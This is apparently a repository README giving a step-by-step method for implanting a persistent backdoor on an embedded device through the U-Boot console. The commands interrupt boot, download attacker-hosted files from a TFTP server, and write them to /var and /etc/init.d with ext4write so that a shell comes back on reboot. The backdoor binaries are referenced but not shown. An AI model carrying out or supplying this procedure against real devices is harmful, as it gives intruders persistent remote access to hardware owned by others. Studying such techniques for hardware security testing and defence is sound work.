We can write our backdoor files on the file system disk of embedded device through U-Boot.  To do so, we must host them on a TFTP server.
(the examples are in this repo)  
So first we must upload them to our tftp server.  
Now, we reboot the embedded device and interrupt the uboot sequence which will drop us into the uboot console.  
we can view our DHCP address via `dhcp` and set the tftp ip via `setenv serverip <ipaddress>`  
Get memory addresses via `bdinfo` so we know where to store our files in memory.  
Now pull the files:  
```
tftp 0x63000000 servicex
tftp 0x64000000 S50servicex
```
After this, we write the files stored in memory to disk (REMEMBER to take note of the last arg, it will change so refer to the out put of tftp download):  
```
ext4write mmc 0:1 0x63000000 /var/servicex 0x5f
ext4write mmc 0:1 0x64000000 /etc/init.d/S50servicex 0x161
```
now reboot the device, let it boot and upon success you should receive your shell.
